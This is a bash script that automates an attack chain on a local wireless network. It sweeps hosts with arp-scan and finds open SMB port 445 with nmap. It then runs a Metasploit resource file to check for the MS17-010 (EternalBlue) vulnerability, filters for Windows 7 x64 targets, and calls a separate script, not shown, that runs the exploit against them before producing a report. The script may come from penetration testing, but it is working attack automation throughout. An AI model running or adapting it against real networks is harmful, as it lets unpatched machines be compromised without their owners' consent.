#!/bin/bash
echo "ARP-SCAN STARTED"
arp-scan -l -i 50 -g --interface=wlan0 -r 1 > ../data/clientlist.txt
echo "ARP-SCAN COMPLETED"
sed '1d;2d;/packets/d;/^$/d;$d;s/\s.*$//' ../data/clientlist.txt > ../data/refined.txt
echo "NMAP STARTED"
nmap -p 445 -iL ../data/refined.txt -oG ../data/port.txt 1> /dev/null
echo "NMAP STOPPED"
cat ../data/port.txt | grep open | sort -u > ../data/portedit.txt
sed 's/(.*//;s/Host: //' ../data/portedit.txt > ../data/openport.txt
echo "MS17_010 SCAN INITIATED"
msfconsole -q -r automsf.rc 1> /dev/null
echo "MS17_010 SCAN COMPLETED"
cat ../data/msf.txt | grep V > ../data/vulnerablePC.txt
cat ../data/vulnerablePC.txt | grep Windows\ 7 | grep x64 | sed 's/[^ ]* //' | sed 's/:.*//' > ip.txt
echo "TESTING EXPLOIT ON THE LIKELY VULNERABLE PC(s)"
./loop.sh
cd ../report
./arp1.sh 2 > /dev/null
echo "TEST COMPLETED!!! CHECK THE REPORT"
exit

